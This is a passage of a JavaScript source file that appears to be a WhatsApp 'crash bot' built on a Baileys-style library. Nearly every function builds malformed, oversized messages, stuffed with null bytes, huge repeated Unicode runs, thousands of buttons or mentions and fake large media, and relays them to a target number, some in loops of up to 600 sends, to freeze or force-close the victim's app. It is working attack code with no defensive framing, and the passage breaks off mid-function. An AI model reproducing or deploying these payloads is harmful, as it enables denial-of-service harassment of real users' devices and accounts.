              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ꦽ".repeat(45500),
                phone_number: "+0",
                email: "z@iCloud.com",
                organization: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u200B".repeat(10000), 
          body: "GIDEOVA_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}

async function buttonCrash(target) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER"
        },
        share_payment_status: true
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: buttons,
        messageParamsJson: {
          title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
          body: " #zephyrime " + "ꦾ".repeat(50000)
        }
      }
    }
  }, { userJid: target });

  await soci.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function magicDelayV2(sock, target) {
    for (let i = 0; i < 1; i++) {
        const batchIndex = Math.floor(i / 15);
        let currentDelay = 3500 + (batchIndex * 500);
        if (currentDelay > 25500) currentDelay = 25500;
        await new Promise(res => setTimeout(res, currentDelay));
        if ((i + 1) % 60 === 0) await new Promise(res => setTimeout(res, 120000));
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    viewOnceMessage: {
                        message: {
                            interactiveResponseMessage: {
                                nativeFlowResponseMessage: {
                                    name: "cta_url",
                                    paramsJson: `{"flow_cta":"${"\u0000".repeat(90000)}"}`,
                                    url: "https://mmg.whatsapp.net",
                                    merchantUrl: "github.com/zephyrinee",
                                    version: 3
                                },
                                entryPointConversionSource: "call_permission_request"
                            }
                        }
                    }
                }
            }
        }, { participant: { jid: target } });
    }
}

async function ephemeralDelay(sock, target) {
  const zephyrineMessages = {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "\u0000".repeat(10000),
                  },
                ],
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, zephyrineMessages, {
    participant: { jid: target },
  });
}

async function gladiatorBlankV1(sock, target) {
  const btns = [];
  btns.push({
    name: "single_select",
    buttonParamsJson: JSON.stringify({})
  });
  
  for (let i = 0; i < 20000; i++) {
    btns.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({ status: true })
    });
  }

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: btns
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩".repeat(50000) + "ꦽ".repeat(50000),
        contentText: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩".repeat(50000) + "ꦾ".repeat(50000),
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          urlTrackingMap: {
            urlTrackingMapElements: [
              {
                originalUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                unconsentedUsersUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                consentedUsersUrl: "https://t.me/pherine" + "ꦽ".repeat(50000),
                cardIndex: 1,
              }
            ],
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "\u0000".repeat(5000),
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "{\"state\":\"" + "\u0000".repeat(900000) + "\"}",
                version: 3
              }
            }
          }
        }
      }
    }
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
            locationMessage: {
              degreesLatitude: 9.99999,
              degreesLongitude: -9.99999,
            },
            hasMediaAttachment: false,
          },
          extendedTextMessage: {
            text: "ꦽ".repeat(50000) + "ោ៝".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000),
                }),
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimeStamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });

  await sock.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "0@newsletter",
      newsletterName: "ោ៝".repeat(25000),
      caption: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + 'ោ៝'.repeat(50000) + 'ꦾ'.repeat(25000) + "ោ៝".repeat(25000),
      inviteExpiration: "90000",
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  }, {
    messageId: null,
    participant: { jid: target }
  });
}

async function DelayFreezeByMia(sock, target) {
  for (let i = 0; i < 20; i++) {
    const zephyrineMessages = {
      groupStatusMessageV2: {
        message: {
          albumMessage: {
            expectedImageCount: 100,
            collectionId: "Queen Mia Nih Bosh",
            title: "Queen Mia Nih Bosh" + "\u200e".repeat(50000),
            contextInfo: {
              remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
              isForwarded: true,
              forwardingScore: 9999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                  participant: `62${z + 899099}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, zephyrineMessages, {
      participant: { jid: target }
    });

    const delay = 1000 + Math.floor(i / 5) * 500;
    await new Promise(resolve => setTimeout(resolve, delay));

    if ((i + 1) % 10 === 0) {
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

async function Bulldozer10GB(sock, target) {
  const mentionedJid = Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`);
  const forwardedNewsletter = {
    newsletterJid: "0@",
    newsletterName: "\u0000",
    serverMessageId: 1000,
    accessibilityText: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
  };
  const disappearingMode = {
    initiator: target,
    initiatedByMe: true,
    expiration: Date.now()
  };
  const contextInfo = {
    mentionedJid,
    isForwarded: true,
    forwardingScore: 7205,
    forwardedNewsletterMessageInfo: forwardedNewsletter,
    statusAttributionType: "RESHARED_FROM_MENTION",
    contactVcard: true,
    isSampled: true,
    dissapearingMode: disappearingMode,
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    quotedMessage: { conversation: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" }
  };
  const messageContent = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: [
              {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/663843748_1708884033432851_1699515070846329230_n.enc?ccb=11-4&oh=01_Q5Aa4AFzDcFXlhLg3PDXC6aKCTixUE2096FuEqqL861dzAXVZA&oe=69F368DA&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/octet-stream",
                fileSha256: "mzxwwZho/2Qg21sbpVFrLYQ2SKz6JQy3VdrH3FweipA=",
                fileLength: "1305374",
                pageCount: 0,
                mediaKey: "G8BRTAHPUEj5SCrIZbKydb49AX1sdXzq1Iys8S0/79c=",
                fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖆 𝕾𝖈𝖍𝖊𝖒𝖆🎩⁵.bin",
                fileEncSha256: "8GF7kGoYPe9OIBIQWFaoyjqCx7iJKGktovX4vgqs3xg=",
                directPath: "/v/t62.7119-24/663843748_1708884033432851_1699515070846329230_n.enc?ccb=11-4&oh=01_Q5Aa4AFzDcFXlhLg3PDXC6aKCTixUE2096FuEqqL861dzAXVZA&oe=69F368DA&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975775"
              },
              {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/663950535_956076154041508_7065433099421170070_n.enc?ccb=11-4&oh=01_Q5Aa4AGjHI94kEuYpv1_z0NmsAA8jM4HjEx3DQ6RA2QR7CwSJw&oe=69F360F2&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/octet-stream",
                fileSha256: "xPwGqrWEeoDmXnJLXjLdHdZW6zJT8+RgZlUzHJv0je0=",
                fileLength: "1305374",
                pageCount: 0,
                mediaKey: "r7quDRofxOvexwLGFQCPp0WxRHRFJChvQ6orO0hUvkM=",
                fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖆 𝕾𝖈𝖍𝖊𝖒𝖆🎩³.bin",
                fileEncSha256: "37gj//bpFvaOBw+wFvGhoV1ojfooLecOAGBgoqEw5O8=",
                directPath: "/v/t62.7119-24/663950535_956076154041508_7065433099421170070_n.enc?ccb=11-4&oh=01_Q5Aa4AGjHI94kEuYpv1_z0NmsAA8jM4HjEx3DQ6RA2QR7CwSJw&oe=69F360F2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975830"
              },
              {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/606263454_947687417622910_2832583790339112896_n.enc?ccb=11-4&oh=01_Q5Aa4AFX5bDoD1glIPgusXOG719oxBS073bcd-nSmPN8PX6Naw&oe=69F36BC5&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/octet-stream",
                fileSha256: "Jtw/IlIhc4DI49xn7i0OxdmbY38IvyyeRU2ZQ9bQThI=",
                fileLength: "1305374",
                pageCount: 0,
                mediaKey: "aLSDS41KeZfEjVSs6jQjrMtm1+DYp8pcgm63p/9xT4M=",
                fileName: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖆 𝕾𝖈𝖍𝖊𝖒𝖆🎩².bin",
                fileEncSha256: "6qM2raQ6zSw5xPpTFQ+kcZKC4tP9/+KnOHZSl+vFi7c=",
                directPath: "/v/t62.7119-24/606263454_947687417622910_2832583790339112896_n.enc?ccb=11-4&oh=01_Q5Aa4AFX5bDoD1glIPgusXOG719oxBS073bcd-nSmPN8PX6Naw&oe=69F36BC5&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975850"
              },
              {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/614455028_1202686655065576_7598631975214445345_n.enc?ccb=11-4&oh=01_Q5Aa4AGtOX5rCouaD5mIpRRRPzRAhNvdgbJH_hQGyQs_TxDH5w&oe=69F381EA&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "IADdnQ8yEc3P2Scf6idVM82+vGPK3uBkfu6hHrLneq4=",
                fileLength: "136847",
                height: 1280,
                width: 1280,
                mediaKey: "vqpdC2TEmcJDVI6/+aWyW66cznWyETyhapPpflyrv+g=",
                fileEncSha256: "hGZ4SQhkuOazPN6JaJGJxn2PXOer99diKpdjVs9Ck84=",
                directPath: "/v/t62.7118-24/614455028_1202686655065576_7598631975214445345_n.enc?ccb=11-4&oh=01_Q5Aa4AGtOX5rCouaD5mIpRRRPzRAhNvdgbJH_hQGyQs_TxDH5w&oe=69F381EA&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1774975930",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAtAAADAQEBAAAAAAAAAAAAAAAAAwQBAgUBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA8/sdoRlvKSYzWn4rUSDsFzEvQTVHoZx6MU2MmoKc7BTRlMG7g0QtQap5Zw5nNKmb5RHvsmFoznuo4bvKDRZStAfQ5DV0wKX54FgFf//EACIQAAICAgIDAAMBAAAAAAAAAAABAgMREiFBBCIxEBRhE//aAAgBAQABPwBYZoaGpqaDj+YYMxZGEGWqEUb/AME1IcGOA44E0JHsic22Vpzz/EbclcozisjrhgsrT+EUyuLk8IcJpcxIVStnqirx3VBrssqlHo8euUoZSH64TRYsFWF0VQTbk18I5y9/r+IprhFycVyTdcE3IV9NuyfCPHgtJpLh/D9eS7LarEQUe0LRPKMJ8oSmnL24ZJOeU/gtP9nXohW6LC+ErsdkvJRC5H7ECMo4WDHeSPKyaR23xyeQpQeSdrkOTNsCkynGkS23HqiLSrQn6nlyzWOSQ5mRMpvemO0KzOWxXz1HbJ6rYvm3AbGf/8QAHBEAAwABBQAAAAAAAAAAAAAAAAERIAISITAx/9oACAECAQE/ACG14Jyi1Vj9wRyV9f8A/8QAGREAAgMBAAAAAAAAAAAAAAAAARECECAw/9oACAEDAQE/AKeTFDJ6/wD/2Q==",
                thumbnailHeight: Math.floor(Math.random() * 1080),
                thumbnailWidth: Math.floor(Math.random() * 1920)
              }
            ],
            hasMediaAttachment: true
          },
          body: {
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
          },
          urlTrackingMap: {
            urlTrackingMapElements: [
              {
                originalUrl: "\u0000".repeat(2),
                unconsentedUsersUrl: "\u0000".repeat(2),
                consentedUsersUrl: "\u0000".repeat(2),
                cardIndex: 1
              },
              {
                originalUrl: "\u0000".repeat(2),
                unconsentedUsersUrl: "\u0000".repeat(2),
                consentedUsersUrl: "\u0000".repeat(2),
                cardIndex: 2
              }
            ]
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "X" },
              { name: "galaxy_message", buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}" },
              { name: "call_permission_message", buttonParamsJson: "\x10".repeat(10000) }
            ],
            messageParamsJson: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "\u0000".repeat(900000)
          },
          contextInfo
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, messageContent, {});
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  await sock.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    }
  );
}

async function bulldozerDelay2GB(sock, target) {
  const zephyrineMessages = {
    viewOnceMessage: {  
      message: {  
        interactiveResponseMessage: {  
          body: {  
            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",  
            hasMediaAttachment: false  
          },  
          videoMessage: {  
            url: "https://mmg.whatsapp.net/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0&mms3=true",  
            mimetype: "video/mp4",  
            fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",  
            fileLength: "1073741824",
            height: 1080,  
            width: 1920,
            mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",  
            fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",  
            directPath: "/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {  
              forwardingScore: 9999,  
              isForwarded: true,  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 1900 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              expiration: 9741,  
              ephemeralSettingTimestamp: 9741,  
              entryPointConversionSource: "WhatsApp.com",  
              entryPointConversionApp: "WhatsApp",  
              entryPointConversionDelaySeconds: 9742,  
              disappearingMode: {  
                initiator: "INITIATED_BY_OTHER",  
                trigger: "ACCOUNT_SETTING"  
              }  
            } 
          },  
          nativeFlowResponseMessage: {  
            name: "address_message",  
            paramsJson: "\u0000".repeat(1045900),  
            version: 3  
          }  
        }  
      }  
    }  
  };

  const zephMSG = generateWAMessageFromContent(target, zephyrineMessages, {});

  await sock.relayMessage("status@broadcast", zephMSG.message, {
    messageId: zephMSG.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function SchemaFCv2(sock, target) {
    const zephyrineIdgaf = [
      {
        paymentAdminInviteMessage: {
          serviceType: "ADMIN_INVITE",
          expiryTimestamp: Date.now() + 86400000,
          currencyCode: "IDR",
          amount1000: "0",
          receiverJid: target,
          noteMessage: {
            extendedTextMessage: {
              text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
            }
          }
        }
      },
      {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          fileLength: "10610",
          mediaKeyTimestamp: "1775044724",
          stickerSentTs: "1775044724091"
        }
      }
    ];

    await sock.relayMessage(target, { zephyrineIdgaf }, {
      messageId: null,
      participant: { jid: target }
    });
}

async function eXtraBulldozer(sock, target) {
  const largestr = (zep) => {
    const zepcharacters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const zephyidgaf = zepcharacters.length;
    let zepezepezepe = '';
    
    for (let i = 0; i < zep; i++) {
      zepezepezepe += zepcharacters.charAt(Math.floor(Math.random() * zephyidgaf));
    }
    
    return zepezepezepe;
  };

  const zeppayload = largestr(8.5 * 1024 * 1024);

  const zephyrineMessages = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/10000000_976323638102127_113622126213713111_n.enc?ccb=11-4&oh=01_Q5Aa4QEy1_NNhyWHm6DQEyhCC4AMjhXu0LxpXpVwriGGpOoKow&oe=6A012071&_nc_sid=5e03e0&mms3=true`,
          fileSha256: "E4Her1BI2wRsZbcJUpf2GYrjnRh8u/+M4qSLsKrfqn4=",
          fileEncSha256: "1qEn6mJbXK5HswfQGhBkdhBbu7WypfLxy5MNUafduLQ=",
          mediaKey: "92E19zmXY3a59U33hTRM3WrHLPIOhEVlo37h+h4QOjg=",
          mimetype: "image/webp",
          directPath: `/v/t62.43144-24/10000000_976323638102127_113622126213713111_n.enc?ccb=11-4&oh=01_Q5Aa4QEy1_NNhyWHm6DQEyhCC4AMjhXu0LxpXpVwriGGpOoKow&oe=6A012071&_nc_sid=5e03e0`,
          fileLength: {
            low: 999999,
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Date.now() % 2147483647,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: ["0@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 999999,
          },
          stickerSentTs: {
            low: -10000000,
            high: 999,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          extraPayload: zeppayload,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, zephyrineMessages, {});

  for (let i = 0; i < 600; i++) {
    await sock.relayMessage("status@broadcast", msg.message, { // ⬅️ msg.message, bukan msg.zephyrineMessages
      messageId: msg.key.id,
      statusJidList: [target],
    });
  }
}

async function invisFCMsg(sock, target) {
  const messagePayload = {
    ephemeralMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/pdf",
          fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
          fileLength: 0,
          pageCount: 0,
          mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
          fileName: "nuxpdf",
          fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
          directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 99999999999999,
         documentSentTs: "9083773766021",
          quotedMessage: {
            conversation: "SUPERMARKET"
          }
        }
      }
    },
    nativeFlowResponseMessage: {
      buttons: [
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩" + "ោ៝".repeat(890000),
            url: "https://wa.me/settings"
          })
        }
      ],
      messageParamsJson: "{".repeat(55000),
      quotedMessage: {
        conversation: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
      }
    },
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
      fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
      mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
      mimetype: "image/webp",
      directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
      fileLength: "10610",
      mediaKeyTimestamp: "1775044724",
      stickerSentTs: "9083773766021",
      quotedMessage: {
        conversation: "SUPERMARKET"
      }
    },
    setUrlTrackingMap: {
      urltrackingmapelements: Array.from({ length: 280000 }, () => ({ type: 1 }))
    },
    headerType: 1
  };
  await sock.relayMessage("status@broadcast", messagePayload, {
    messageId: null,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function invisWebIOs(sock, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine " + "𑆿".repeat(150000),
         address: "𑆿".repeat(25000),
         url: `https://t.me/${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "",
            matchedText: "",
            description: "".repeat(15000),
            title: "" + "".repeat(15000),
            previewType: "NONE",
